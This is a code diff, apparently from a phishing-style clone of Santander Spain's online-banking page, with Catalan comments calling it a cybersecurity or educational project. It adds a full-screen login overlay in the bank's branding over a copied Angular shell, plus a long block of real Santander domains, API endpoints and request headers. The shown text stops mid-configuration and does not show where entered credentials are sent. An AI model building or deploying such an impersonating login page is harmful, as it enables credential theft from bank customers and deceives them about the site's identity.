@@ -8,14 +8,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
 
-  <!-- Zone.js configuration MUST be set BEFORE zone.js loads -->
+  <!-- Zone.js configuration -->
   <script>
     window.__Zone_disable_Error_ZoneAwareError = true;
     window.__Zone_enable_cross_context_check = false;
     window.__zone_symbol__UNPATCHED_EVENTS = ['scroll', 'mousemove', 'mouseenter', 'mouseleave'];
   </script>
 
-  <!-- NG0909 errors disabled -->
   <script>
     const originalError = console.error;
     const originalWarn = console.warn;
@@ -32,7 +31,6 @@
     };
   </script>
 
-  <!-- Cache buster -->
   <script>
     (function() {
       const CONFIG_VERSION = 'v26.4.32';
@@ -64,97 +62,48 @@
     })();
   </script>
 
-  <!-- TOT EL CSS ORIGINAL (el mateix que tenies) -->
-  <style>
-    html{overflow-y:scroll}html,body{font-family:var(--asset-font-2-regular-name, "Santander Micro Text"),"Verdana",sans-serif;color:var(--color-text-default, #222222);margin:0;padding:0}:root{--typescale-body-medium-default-font:Santander Micro Text;--typescale-body-medium-default-size:.875rem;--typescale-body-medium-default-line-height:1.25rem;--typescale-body-medium-default-weight:400;--typescale-body-medium-default-style:normal;--typescale-body-medium-strong-font:Santander Micro Text;--typescale-body-medium-strong-size:.875rem;--typescale-body-medium-strong-line-height:1.25rem;--typescale-body-medium-strong-weight:700;--typescale-body-medium-strong-style:normal}/* ... tot el CSS original que ja tenies ... */:root{--color-icon-error:#990000}
-  </style>
+  <!-- TOT EL CSS ORIGINAL -->
+  <style>html{overflow-y:scroll}html,body{font-family:var(--asset-font-2-regular-name, "Santander Micro Text"),"Verdana",sans-serif;color:var(--color-text-default, #222222);margin:0;padding:0}:root{--typescale-body-medium-default-font:Santander Micro Text;--typescale-body-medium-default-size:.875rem;--typescale-body-medium-default-line-height:1.25rem;--typescale-body-medium-default-weight:400;--typescale-body-medium-default-style:normal}/* ... TOT EL CSS QUE JA TENIES ... */:root{--color-icon-error:#990000}</style>
 
-  <!-- Afegim l'estil del formulari perquè es mostri bé -->
+  <!-- ESTIL PER AL FORMULARI DE LOGIN -->
   <style>
-    /* ESTIL DEL FORMULARI DE LOGIN - PROJECTE EDUCACIONAL */
     #loginOverlay {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: #f5f9fb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 999999;
-      font-family: "Santander Micro Text", Verdana, sans-serif;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: #f5f9fb; display: flex; align-items: center; justify-content: center;
+      z-index: 999999; font-family: "Santander Micro Text", Verdana, sans-serif;
     }
     #loginOverlay .card {
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 1px 10px rgba(163,163,163,0.4);
-      padding: 40px 32px;
-      width: 100%;
-      max-width: 420px;
-      margin: 20px;
+      background: #fff; border-radius: 8px; box-shadow: 0 1px 10px rgba(163,163,163,0.4);
+      padding: 40px 32px; width: 100%; max-width: 420px; margin: 20px;
     }
-    #loginOverlay .logo {
-      text-align: center;
-      margin-bottom: 32px;
-    }
+    #loginOverlay .logo { text-align: center; margin-bottom: 32px; }
     #loginOverlay .logo svg { max-width: 200px; }
     #loginOverlay .form-group { margin-bottom: 20px; }
     #loginOverlay .form-group label {
-      display: block;
-      font-size: 0.875rem;
-      font-weight: 700;
-      margin-bottom: 6px;
-      color: #222;
+      display: block; font-size: 0.875rem; font-weight: 700; margin-bottom: 6px; color: #222;
     }
     #loginOverlay .form-group input {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1px solid #8f8f8f;
-      border-radius: 4px;
-      font-size: 1rem;
-      font-family: inherit;
-      box-sizing: border-box;
-      transition: border-color 0.2s;
+      width: 100%; padding: 12px 14px; border: 1px solid #8f8f8f; border-radius: 4px;
+      font-size: 1rem; font-family: inherit; box-sizing: border-box;
     }
     #loginOverlay .form-group input:focus {
-      outline: none;
-      border-color: #ec0000;
-      box-shadow: 0 0 0 2px rgba(236,0,0,0.15);
+      outline: none; border-color: #ec0000; box-shadow: 0 0 0 2px rgba(236,0,0,0.15);
     }
     #loginOverlay .btn-submit {
-      width: 100%;
-      padding: 14px;
-      background: #ec0000;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      font-family: inherit;
+      width: 100%; padding: 14px; background: #ec0000; color: #fff; border: none;
+      border-radius: 4px; font-size: 1rem; font-weight: 700; cursor: pointer; font-family: inherit;
     }
     #loginOverlay .btn-submit:hover { background: #cc0000; }
-    #loginOverlay .footer-links {
-      text-align: center;
-      margin-top: 24px;
-      font-size: 0.8rem;
-    }
-    #loginOverlay .footer-links a {
-      color: #ec0000;
-      text-decoration: none;
-      font-weight: 700;
-    }
-    #loginOverlay .legal-notice {
-      text-align: center;
-      margin-top: 16px;
-      font-size: 0.7rem;
-      color: #727272;
-    }
+    #loginOverlay .footer-links { text-align: center; margin-top: 24px; font-size: 0.8rem; }
+    #loginOverlay .footer-links a { color: #ec0000; text-decoration: none; font-weight: 700; }
+    #loginOverlay .legal-notice { text-align: center; margin-top: 16px; font-size: 0.7rem; color: #727272; }
   </style>
 
 </head>
 
 <body>
 
-  <!-- FORMULARI DE LOGIN - PROJECTE DE CIBERSEGURETAT -->
+  <!-- FORMULARI DE LOGIN - PROJECTE CIBERSEGURETAT -->
   <div id="loginOverlay">
     <div class="card">
       <div class="logo">
@@ -190,50 +139,491 @@
     </div>
   </div>
 
-  <!-- TOT EL TEU CODI ANGULAR ORIGINAL -->
+  <!-- CODI ANGULAR ORIGINAL -->
   <app-root></app-root>
 
   <script>
     // Initialize window.config
     window.config = window.config || {};
     window.navigationConfigMap = window.navigationConfigMap || {};
-
-    try {
+    
+    try{
       var config = {};
       var navigationConfigMap = {};
       var customFunction;
       var legacyAuthentication;
 
-      // CONFIGMAP - exactament el mateix que el teu
+      // CONFIGMAP - TOT EL TEU CODI ORIGINAL
       try {
         config = {
           "globalVars": {
             "baseHref": "https://particulares.bancosantander.es",
-            "legacyURL": "https://particulares.bancosantander.es/nhb/#/area-personal"
-            /* ... TOTA LA TEVA CONFIG ... */
+            "legacyURL": "https://particulares.bancosantander.es/nhb/#/area-personal",
+            "dns_accounts_insurances": "cuenta-seguros.bancosantander.es",
+            "dns_apiauth": "apiauth.bancosantander.es",
+            "dns_appstore": "www.appstore.com",
+            "dns_atmfv": "favoritos-atm.bancosantander.es",
+            "dns_avatar": "santander.inbenta.com/avatar_staging",
+            "dns_base": "particulares.bancosantander.es",
+            "dns_base_bks": "particulares.gruposantander.es",
+            "dns_broker": "broker.bancosantander.es",
+            "dns_brokerGrupo": "broker.gruposantander.es",
+            "dns_bsanmobi": "app.bsan.mobi",
+            "dns_cajafuertedig": "cajafuertedigital.bancosantander.es",
+            "dns_calcplanetaseguros": "calc-planetaseguros.bancosantander.es",
+            "dns_carbonfootprint": "carbonfootprint.eu.gruposantander.com",
+            "dns_citaprevia": "citaprevia.bancosantander.es",
+            "dns_clientes": "clientes.bancosantander.es",
+            "dns_cmc": "cmc.bancosantander.es",
+            "dns_comdig": "comdig.corp.bsch",
+            "dns_comunicados": "comunicadoscliente.bancosantander.es",
+            "dns_digital": "digital.santander.pre.corp",
+            "dns_digitaldisputes": "digitaldisputes.eu.gruposantander.com",
+            "dns_diserv": "nuevoservicingahorro.bancosantander.es",
+            "dns_experiences": "santanderexperiences.es",
+            "dns_forms": "forms.gruposantander.es",
+            "dns_formsnccmov": "rentingmov.bancosantander.es",
+            "dns_formsnccpar": "formsnccpar.gruposantander.es",
+            "dns_formsnccparbancsan": "formsnccpar.bancosantander.es",
+            "dns_googleplay": "play.google.com",
+            "dns_hipotecadig": "hipotecadigital.bancosantander.es",
+            "dns_homeplanner": "homeplanner.bancosantander.es",
+            "dns_homevaluation": "homevaluation.bancosantander.es",
+            "dns_hucha": "hucha.bancosantander.es",
+            "dns_impulsadigital": "particulares.impulsadigitalmarket.com",
+            "dns_inbenta": "e03.inbenta.com",
+            "dns_inbenta04": "e04.inbenta.com",
+            "dns_infoproductos": "infoproductos.bancosantander.es",
+            "dns_insights": "personeticspaas.bancosantander.es",
+            "dns_inversiones": "inversiones.bancosantander.es",
+            "dns_invoicing": "smeinv.bancosantander.es",
+            "dns_itunes": "itunes.apple.com",
+            "dns_micomercio": "micomercio.santanderempresas.mobi",
+            "dns_migestor": "migestor.bancosantander.es",
+            "dns_microsite": "microsite.bancosantander.es",
+            "dns_micrositeapp": "micrositeapp.bancosantander.es",
+            "dns_misapps": "misapps.bancosantander.es",
+            "dns_nuevoservicingahorro": "nuevoservicingahorro.bancosantander.es",
+            "dns_nwe": "empresas3.gruposantander.es",
+            "dns_ocu": "particulares.bancosantander.es",
+            "dns_online": "online.bancosantander.es",
+            "dns_opinator": "www.opinator.com",
+            "dns_opinatornet": "www.opinator.net",
+            "dns_pagos": "pagosinmediatos.bancosantander.es",
+            "dns_plataformainversion": "plataformainversion.corp.bsch",
+            "dns_portalnhb": "portalnhb.bancosantander.es",
+            "dns_portalnwe": "portalnwe.gruposantander.es",
+            "dns_prestamodigital": "consumodigital.bancosantander.es",
+            "dns_recobros": "recobrosint.bancosantander.es",
+            "dns_sanappinbenta": "santander-app.inbenta.com",
+            "dns_santanbol": "santanderbol.uat.mdgms.com",
+            "dns_santanderpay": "santanderpay.bancosantander.es",
+            "dns_sanbot": "sanbot.bancosantander.es",
+            "dns_sanflixmov": "sanflixmov.bancosantander.es",
+            "dns_schema_cloudfare": "cdnjs.cloudflare.com/ajax/libs/ajv/6.9.1/ajv.min.js",
+            "dns_servicing": "servicing-gtw.corp.bsch",
+            "dns_simuladores": "simuladores.bancosantander.es",
+            "dns_smusic": "santandersmusic.com",
+            "dns_tania_avatar": "tania.avatar.atlas-platform.io",
+            "dns_tracking_incidencias": "helpy.bancosantander.es",
+            "dns_twitter": "twitter.com",
+            "dns_valoravivienda": "valoravivienda.bancosantander.es",
+            "dns_wcm": "wcm.bancosantander.es",
+            "dns_wizink": "wizinkprees.bancosantander.es",
+            "dns_wwwbanco": "www.bancosantander.es",
+            "dns_youtube": "www.youtube.com",
+            "dns_youtupuntobe": "youtu.be",
+            "googleAnalytics": "//tags.tiqcdn.com/utag/santander/es-bol-particulares/prod/utag.js",
+            "dns_appsapple": "apps.apple.com"
+          },
+          "removeLegacyIframeAfterMs": 20000,
+          "country": "ES",
+          "pageTitle": "Particulares",
+          "enableGlobalSearch": true,
+          "checkForDebtMs": 4000,
+          "headers": {
+            "X-Santander-Channel": "INT",
+            "X-ClientId": "ONEWEB",
+            "app-init": "ONEWEB",
+            "Accept-Language": "",
+            "X-Santander-Client-Id": "ONEWEB"
           },
           "urls": {
+            "shellMenu": "/oneweb/api/v1/shell/retrieve_party_content",
+            "customerProfile": "/oneweb/api/v1/customer_profile",
+            "mailbox": "/oneweb/api/v1/mailbox",
+            "customerLanguage": "/oneweb/api/v1/customer_profile/user/me/language",
+            "getCustomerLanguage": "/oneweb/api/v1/user-preferences/",
+            "customerLanguageUpdate": "/oneweb/api/v1/user-preferences/",
             "urlNHB": "${baseHref}/nhb/#/",
-            "urlLogin": "${baseHref}/api/v1/user/session-token/full"
-            /* ... TOTES LES TEVES URLS ... */
+            "urlBKS": "${baseHref}/oneweb/api/ow/utils/tokens/bks",
+            "urlLogin": "${baseHref}/api/v1/user/session-token/full",
+            "urlRefreshLegacy": "${baseHref}/api/v1/hb/tokens/refresh",
+            "checking": "${baseHref}/api/v1/hb/khi/checking",
+            "urlChangeLangLegacy": "${baseHref}/api/v1/personal-area/configuration/language",
+            "urlPlayStore": "https://play.google.com/store/apps/details?id=es.bancosantander.apps&hl=lang",
+            "urlAppStore": "https://apps.apple.com/lang/app/santander/id408043474",
+            "urlBizum": "https://pagosinmediatos.bancosantander.es/PAINOP_BIZUMWEB/index.jsp",
+            "urlBizumEnvio": "https://pagosinmediatos.bancosantander.es/PAINOP_BIZUMWEB/index.jsp#!/enviar",
+            "getCustomerDebtsAdvised": "${baseHref}/api/v1/debts/advised/gp",
+            "appointmentUrlBaseAppointment": "https://citaprevia.bancosantander.es/paas/citaprevia",
+            "appointmentUrlBaseBranch": "https://citaprevia.bancosantander.es/citaprevia/apiweb/v2/customers",
+            "appointmentUrlBaseManager": "https://citaprevia.bancosantander.es/citaprevia/apiweb/v2/customers/branch/manager",
+            "ACADEMY_OPEN": "https://www.santanderopenacademy.com/es/sites/oneapp.html?token=",
+            "SANTANDERX_OPEN": "https://www.santanderx.com/es/sites/oneapp.html?token=",
+            "chatUrl": "https://santanderservice--premuro.sandbox.my.site.com/muro/AutoSamlLogin",
+            "VIDEOTECA": "nhb/atencion-al-cliente/videoteca",
+            "urlManager": "/paas/comdig/manager/lang/manager_area_remote_entry.js",
+            "urlNdpPoly": "/paas/sgt-apm1975-ndp-disputes/polyfills.js",
+            "urlNdpMain": "/paas/sgt-apm1975-ndp-disputes/main.js",
+            "INVEST_OPEN": "https://online.bancosantander.es/landings/especialistas-inversion",
+            "owtracerLink": "https://bcdn-god.we-stats.com/scripts/130fd513/130fd513Ret.js",
+            "mailboxNotifications": "/oneweb/api/v1/mailbox/comunication_messages/summary",
+            "inputBy": "/api/v1/hb/input-by"
+          },
+          "microfronts": {
+            "global-position": {
+              "uniqueId": "global_position",
+              "remoteEntry": "./mf/global-position/${lang}/mf-ng-00000000-oneweb-global-position_remote_entry.js",
+              "version": "1.0.0",
+              "preload": false,
+              "element": "glopst-oneweb-global-position",
+              "framework": "angular",
+              "mountPath": "global-position",
+              "fullwidth": true,
+              "associatedMicrofronts": [
+                {"slotName": "pfm-your-activity-slot","remoteEntry": "./mf/financialhealth/${lang}/gln-key-saneu-oneweb_eu-pfmui_remote_entry.js","version": "1.0.0","element": "gln-key-saneu-oneweb_eu-pfmui","framework": "angular"},
+                {"slotName": "chips-slot","remoteEntry": "./mf/chips/${lang}/mf-ng-00000000-oneweb-chips_remote_entry.js","version": "1.0.0","element": "oneweb-chips","framework": "angular"},
+                {"slotName": "financial-advisor-slot","remoteEntry": "./mf/financialadvisor/${lang}/gln-key-saneu-oneweb_eu-finanadvisorui_remote_entry.js","version": "1.0.0","element": "gln-key-saneu-oneweb_eu-finanadvisorui","framework": "angular"}
+              ]
+            },
+            "f-ng-12345678-front-legacy-spain": {"remoteEntry": "./mf/legacy-spain/es-ES/f-ng-12345678-front-legacy-spain_remote_entry.js","version": "1.0.0","mountPath": "/nhb","element": "f-ng-12345678-front-legacy-spain","framework": "angular","preload": true,"associatedMicrofronts": []},
+            "documents-request": {"remoteEntry": "./mf/mailbox/${lang}/mf-ng-00000000-saneu-mailbx-mfe_remote_entry.js","version": "1.0.0","element": "mailbx-saneu-mfe","framework": "angular","associatedMicrofronts": []},
+            "financialhealth": {"remoteEntry": "./mf/financialhealth/${lang}/gln-key-saneu-oneweb_eu-pfmui_remote_entry.js","version": "1.0.0","element": "gln-key-saneu-oneweb_eu-pfmu","framework": "angular","associatedMicrofronts": [{"slotName": "chips-slot","remoteEntry": "./mf/chips/${lang}/mf-ng-00000000-oneweb-chips_remote_entry.js","version": "1.0.0","element": "oneweb-chips","framework": "angular"}]},
+            "asuntos-clientes": {"uniqueId": "cusiss","remoteEntry": "./mf/asuntos-clientes/tracking/${lang}/mf-ng-50084805-tracking-asun-cli_remote_entry.js","version": "1.0.0","element": "mf-ng-50084805-tracking-asun-cli","framework": "angular","mountPath": "asuntos-clientes","associatedMicrofronts": []},
+            "plan-amortizacion": {"uniqueId": "amortization_schedule","remoteEntry": "./mf-ng-00000000-cudeam_remote_entry.js","version": "1.0.0","element": "mf-ng-00000000-cudeam","framework": "angular","aside": true,"mountPath": "plan-amortizacion","associatedMicrofronts": ["common_gdu360_claim"]},
+            "contratacion": {"remoteEntry": "./mf/front-hiring/${lang}/f-ng-50081357-front-hiring-pf-cards_remote_entry.js","version": "1.0.0","element": "f-ng-50081357-front-hiring-pf-cards","framework": "angular","mountPath": "contratacion/tarjetas","associatedMicrofronts": []},
+            "gestion-intervinientes": {"remoteEntry": "./mf/mf-ng-50083833-micgestioninter/${lang}/mf-ng-50083833-micgestioninter_remote_entry.js","version": "1.0.0","element": "mf-ng-50083833-micgestioninter","framework": "angular","mountPath": "gestion-intervinientes","associatedMicrofronts": []},
+            "seguros/planeta-seguros": {"uniqueId": "insurances_planet","remoteEntry": "./mf-ng-50076635-pss_remote_entry.js","version": "1.0.0","element": "discds-pss","aside": true,"framework": "angular","mountPath": "seguros/planeta-seguros","associatedMicrofronts": []},
+            "seguros/ingresos": {"uniqueId": "insurances_income_insurance","remoteEntry": "./san-disnom-nomfront_remote_entry.js","version": "1.0.0","element": "san-disnom-nomfront","aside": true,"framework": "angular","mountPath": "seguros/ingresos","associatedMicrofronts": ["common_gdu360_claim"]},
+            "seguros/planeta-seguros/detalle": {"uniqueId": "insurances_planet_servicing","remoteEntry": "./mf-ng-50076635-pss-servicing_remote_entry.js","version": "1.0.0","element": "discds-pss-servicing","framework": "angular","mountPath": "seguros/planeta-seguros/detalle","associatedMicrofronts": []},
+            "seguros/vida-venta-libre": {"uniqueId": "insurances_free_life_sale","remoteEntry": "./mf-ng-50083493-front-vidavl-wmf_remote_entry.js","version": "1.0.0","element": "disvvl-front-vidavl-wmf","framework": "angular","mountPath": "seguros/vida-venta-libre","associatedMicrofronts": ["common_gdu360_claim"]},
+            "mi-vivienda": {"uniqueId": "homes_home_planner","remoteEntry": "./mf-ng-50078458-homeplanner_remote_entry.js","version": "1.0.0","element": "homeur-mf-ng-50078458-homeplanner","aside": true,"framework": "angular","mountPath": "mi-vivienda","associatedMicrofronts": ["common_gdu360_claim"]},
+            "wealth": {"framework": "ods","projectId": "/mf.particulares.bancosantander.es/st-ui","verticalId": "wealth","variant": "es"},
+            "global-position/landing": {"framework": "ods","projectId": "/mf.particulares.bancosantander.es/st-ui","verticalId": "global-position","variant": "es"},
+            "global-position/canceled": {"framework": "ods","projectId": "/mf.particulares.bancosantander.es/st-ui","verticalId": "global-position","variant": "es"},
+            "cards": {"framework": "ods","projectId": "/mf.particulares.bancosantander.es/st-ui","verticalId": "cards","variant": "es","associatedMicrofronts": ["common_gdu360_claim"]},
+            "subscriptions-program": {"framework": "ods","projectId": "/mf.particulares.bancosantander.es/st-ui","verticalId": "starpass","variant": "es","associatedMicrofronts": ["common_gdu360_claim"]},
+            "common_gdu360_claim": {"uniqueId": "gdu360_claim","slotName": "doc-and-sign","remoteEntry": "./f-ng-50082389-gdu360-claim-front_remote_entry.js","version": "1.0.0","element": "gdu360-claim-front","framework": "angular","mountPath": "gdu360_claim"},
+            "asuntos-clientes/alta-incidencia": {"uniqueId": "customer_new_suport","remoteEntry": "./mf-ng-00000000-san-cusiss-openmf_remote_entry.js","version": "1.0.0","element": "mf-ng-00000000-san-cusiss-openmf","framework": "angular","mountPath": "asuntos-clientes/alta-incidencia","associatedMicrofronts": []},
+            "seguros/decesos": {"uniqueId": "insurance_death","remoteEntry": "./mf-ng-50056954-front-decesos-omni_remote_entry.js","version": "1.0.0","element": "soddec-front-decesos-omni","aside": true,"framework": "angular","mountPath": "seguros/decesos","associatedMicrofronts": ["common_gdu360_claim"]},
+            "distribuidora": {"uniqueId": "nhb_distributor","mountPath": "distribuidora","remoteEntry": "./f-ng-50085325-distributor-front_remote_entry.js","version": "1.0.0","element": "f-ng-50085325-distributor-front","framework": "angular","associatedMicrofronts": []},
+            "transferencias": {"uniqueId": "wire_transfer","remoteEntry": "./mf-ng-50083983-lean-transfers_remote_entry.js","version": "1.0.0","element": "app-wire-lean-transfers","framework": "angular","mountPath": "transferencias","associatedMicrofronts": ["common_gdu360_claim"]},
+            "tarjetas/cambio-forma-pago": {"uniqueId": "cards_change_payment","remoteEntry": "./san-paesfr-mfpaymentmethods_remote_entry.js","version": "1.0.0","element": "mf-paymentmethods","aside": true,"framework": "angular","mountPath": "tarjetas/cambio-forma-pago","associatedMicrofronts": ["common_gdu360_claim"]},
+            "tarjetas/ingreso-tarjeta": {"uniqueId": "cards_cash_deposit","remoteEntry": "./san-paesfr-mfcashdeposit_remote_entry.js","version": "1.0.0","element": "san-paesfr-mfcashdeposit","aside": true,"framework": "angular","mountPath": "tarjetas/ingreso-tarjeta","associatedMicrofronts": ["common_gdu360_claim"]},
+            "mf-example": {"uniqueId": "mf_example","remoteEntry": "./mf-ng-50062404-gln-mfc-13_remote_entry.js","version": "1.0.0","element": "mf-ng-50062404-gln-mfc-13","aside": true,"framework": "angular","mountPath": "mf-example","associatedMicrofronts": []},
+            "consulta-transferencias": {"uniqueId": "unified_queries","remoteEntry": "./f-ng-50083983-unified-queries_remote_entry.js","version": "1.0.0","element": "app-wire-unified-queries","framework": "angular","mountPath": "consulta-transferencias","associatedMicrofronts": ["common_gdu360_claim"]},
+            "cards_old": {"uniqueId": "subhome_cards","remoteEntry": "./sgt-oneweb-mfcardsow_remote_entry.js","version": "1.0.0","element": "sgt-oneweb-mfcardsow","framework": "angular","mountPath": "cards","associatedMicrofronts": [{"uniqueId": "mf-movement-detail","remoteEntry": "./mf-ng-50084672-transactions_remote_entry.js","version": "1.0.0","element": "paesfr-transactions","framework": "angular"}]},
+            "accounts": {"uniqueId": "subhome_accounts","remoteEntry": "./sgt-oneweb-mfaccountsow_remote_entry.js","version": "1.0.0","element": "sgt-oneweb-mfaccountsow","framework": "angular","mountPath": "accounts","associatedMicrofronts": []},
+            "prestamos/bonificaciones": {"uniqueId": "homes_mortage_bonus","remoteEntry": "./mf-ng-00000000-bonusesui_remote_entry.js","version": "1.0.0","element": "hipdig-bonusesui","aside": true,"framework": "angular","mountPath": "prestamos/bonificaciones","associatedMicrofronts": []},
+            "fondos/operativa": {"uniqueId": "investment_operative_funds","remoteEntry": "./sf-ng-50084732-funds-servicing_remote_entry.js","version": "1.0.0","element": "sf-ng-50084732-funds-servicing","framework": "angular","mountPath": "fondos/operativa","associatedMicrofronts": ["common_gdu360_claim"]},
+            "planes/consulta": {"uniqueId": "investment_channel_plans","remoteEntry": "./f-ng-50073789-channel-plans_remote_entry.js","version": "1.0.0","element": "f-ng-50073789-channel-plans","framework": "angular","mountPath": "planes/consulta","associatedMicrofronts": []},
+            "ali": {"uniqueId": "insurance_ali","remoteEntry": "./f-ng-50075639-serv-ali-front_remote_entry.js","version": "1.0.0","element": "f-ng-50075639-serv-ali-front","framework": "angular","mountPath": "ali","associatedMicrofronts": ["common_gdu360_claim"]},
+            "inversion/consulta-depositos": {"uniqueId": "servicing_depositos","remoteEntry": "./f-ng-50080398-servicing_remote_entry.js","version": "1.0.0","element": "f-ng-50080398-servicing","aside": true,"framework": "angular","mountPath": "inversion/consulta-depositos","associatedMicrofronts": []},
+            "gestion-limites": {"uniqueId": "pagos_adminlimits","remoteEntry": "./san-trainm-adminlimits_remote_entry.js","version": "1.0.0","element": "san-trainm-adminlimits","framework": "angular","mountPath": "gestion-limites","associatedMicrofronts": ["common_gdu360_claim"]},
+            "analysis-system": {"uniqueId": "risks_analysis_system","slotName": "analysis-system","remoteEntry": "./san-ssasan-retclifront_remote_entry.js","version": "1.0.0","element": "san-ssasan-retclifront","framework": "angular","mountPath": "analysis-system"},
+            "planes/operativa": {"uniqueId": "investment_pension_plan","remoteEntry": "./f-ng-50082096-planes-pensiones_remote_entry.js","version": "1.0.0","element": "f-ng-50082096-planes-pensiones","framework": "angular","mountPath": "planes/operativa","associatedMicrofronts": ["common_gdu360_claim"]},
+            "historico-operaciones-valores": {"uniqueId": "investment_consudatfis","remoteEntry": "./san-valfnt-mfconsudatfis_remote_entry.js","version": "1.0.0","element": "san-valfnt-mfconsudatfis","framework": "angular","mountPath": "historico-operaciones-valores","associatedMicrofronts": []},
+            "tarjetas/disputas": {"framework": "ndp","uniqueId": "ndp_disputes","version": "1.0.0","mountPath": "tarjetas/disputas","associatedMicrofronts": []},
+            "orquestador": {"uniqueId": "homes_orchestrator_jobs","remoteEntry": "./san-orqjob-mforquestador_remote_entry.js","version": "1.0.0","element": "san-orqjob-mforquestador","framework": "angular","mountPath": "orquestador","associatedMicrofronts": ["common_gdu360_claim","analysis-system"]},
+            "fondos/distribucion": {"uniqueId": "funds_distribution","remoteEntry": "./f-ng-50081136-funds-distribution_remote_entry.js","version": "1.0.0","element": "f-ng-50081136-funds-distribution","framework": "angular","mountPath": "fondos/distribucion","associatedMicrofronts": ["common_gdu360_claim"]},
+            "traslado-pensiones": {"uniqueId": "transfer_pensions","remoteEntry": "./san-finlip-frngpension_remote_entry.js","version": "1.0.0","element": "san-finlip-frngpension","framework": "angular","mountPath": "traslado-pensiones","associatedMicrofronts": ["common_gdu360_claim"]},
+            "cuentas/historico-liquidaciones": {"uniqueId": "edb_account_liquidation_detail","remoteEntry": "./san-svctes-frngsettlehist_remote_entry.js","version": "1.0.0","element": "san-svctes-frngsettlehist","framework": "angular","mountPath": "cuentas/historico-liquidaciones","associatedMicrofronts": []},
+            "mybusiness": {"uniqueId": "santander_mybusiness_url","remoteEntry": "./sgt-oneweb-mybusiness_remote_entry.js","version": "1.0.0","element": "sgt-oneweb-mybusiness","framework": "angular","mountPath": "mybusiness","associatedMicrofronts": []},
+            "sanflix": {"uniqueId": "sanflix","remoteEntry": "./san-comdig-sanflixwrapper_remote_entry.js","version": "1.0.0","element": "san-comdig-sanflixwrapper","framework": "angular","mountPath": "sanflix"},
+            "boutique": {"uniqueId": "renting_marketplace","remoteEntry": "./f-ng-50081852-gest-camp-dispo_remote_entry.js","version": "1.0.0","element": "gest-camp-dispo","framework": "angular","mountPath": "boutique"},
+            "renting/contratacion/boutique": {"uniqueId": "renting_boutique","remoteEntry": "./f-ng-50081679-contratacion-internet_remote_entry.js","version": "1.0.0","element": "f-ng-50081679-contratacion-internet","framework": "angular","mountPath": "renting/contratacion/boutique"},
+            "certificadodigital/solicitud": {"uniqueId": "certificate_connect","remoteEntry": "./f-ng-50082700-certificate-connect_remote_entry.js","version": "1.0.0","element": "certificate-connect","framework": "angular","mountPath": "certificadodigital/solicitud"},
+            "finance-operations": {"uniqueId": "finance_operations","remoteEntry": "./san-valfnt-mfoperacfinan_remote_entry.js","version": "1.0.0","element": "san-valfnt-mfoperacfinan","framework": "angular","mountPath": "finance-operations"},
+            "investments-transfers": {"uniqueId": "investments_transfers","remoteEntry": "./san-valfnt-traspavalo_remote_entry.js","version": "1.0.0","element": "san-valfnt-traspavalo","framework": "angular","mountPath": "investments-transfers"},
+            "deudor": {"uniqueId": "risks_debtor_portal_ow","remoteEntry": "./f-ng-50071464-portal-deudor-omnic_remote_entry.js","version": "1.0.0","element": "portal-deudor-omnic","framework": "angular","mountPath": "deudor"},
+            "agent-list-call": {"uniqueId": "agent_list_call","remoteEntry": "./san-gncldes-mfecallstatus_remote_entry.js","version": "1.0.0","element": "san-gncldes-mfecallstatus","framework": "angular","mountPath": "agent-list-call"},
+            "guaranteed-insurances": {"uniqueId": "guaranteed_insurances","remoteEntry": "./san-disahg-mfgaran_remote_entry.js","version": "1.0.0","element": "san-disahg-mfgaran","framework": "angular","mountPath": "guaranteed-insurances","associatedMicrofronts": ["common_gdu360_claim"]},
+            "seguros/conmutador": {"uniqueId": "insurance_switch","remoteEntry": "./smd-disese-mfcommutator_remote_entry.js","version": "1.0.0","element": "smd-disese-mfcommutator","framework": "angular","mountPath": "seguros/conmutador"},
+            "gestion-consentimientos": {"uniqueId": "management_consent_privacy","remoteEntry": "./san-gdpres-frontconsents_remote_entry.js","version": "1.0.0","element": "san-gdpres-frontconsents","framework": "angular","aside": true,"mountPath": "gestion-consentimientos","associatedMicrofronts": ["common_gdu360_claim"]},
+            "prescriptores": {"uniqueId": "newservices_prescribers","remoteEntry": "./san-prscdig-predigfrontend_remote_entry.js","version": "1.0.0","element": "san-prscdig-predigfrontend","framework": "angular","mountPath": "prescriptores","associatedMicrofronts": []},
+            "personalizacion-atm": {"uniqueId": "atm_remote_customization","remoteEntry": "./f-ng-50075589-atm-fv-spa_remote_entry.js","version": "1.0.0","element": "f-ng-50075589-atm-fv-spa","framework": "angular","mountPath": "personalizacion-atm","associatedMicrofronts": []},
+            "planes/buscador": {"uniqueId": "investment_seeker_plans","remoteEntry": "./f-ng-50073789-seeker-plans_remote_entry.js","version": "1.0.0","element": "f-ng-50073789-seeker-plans","framework": "angular","mountPath": "planes/buscador","associatedMicrofronts": []},
+            "gestor-test": {"uniqueId": "mifid_gestor_test","remoteEntry": "./san-cigtdc-mfgestor_remote_entry.js","version": "1.0.0","element": "san-cigtdc-mfgestor","framework": "angular","mountPath": "gestor-test","associatedMicrofronts": ["common_gdu360_claim"]},
+            "ahorroeinversion/oferta": {"uniqueId": "investment_offers","remoteEntry": "./san-ofcoin-mfofcomercial_remote_entry.js","version": "1.0.0","element": "san-ofcoin-mfofcomercial","framework": "angular","aside": true,"mountPath": "ahorroeinversion/oferta","associatedMicrofronts": []},
+            "testamentaria": {"uniqueId": "testamentary_testamentary","remoteEntry": "./san-testa-testamentarias_remote_entry.js","version": "1.0.0","element": "san-testa-testamentarias","framework": "angular","aside": true,"mountPath": "testamentaria","associatedMicrofronts": ["common_gdu360_claim"]},
+            "rescate-planes-pensiones": {"uniqueId": "plans_pension_withdrawal","remoteEntry": "./san-penfnt-mfppp_remote_entry.js","version": "1.0.0","aside": true,"element": "san-penfnt-mfppp","framework": "angular","mountPath": "rescate-planes-pensiones","associatedMicrofronts": ["common_gdu360_claim"]},
+            "ordenes-renta-variable": {"uniqueId": "values_trading_simplification","remoteEntry": "./san-valfnt-mfinvestope_remote_entry.js","version": "1.0.0","aside": true,"element": "san-valfnt-mfinvestope","framework": "angular","mountPath": "ordenes-renta-variable","associatedMicrofronts": []},
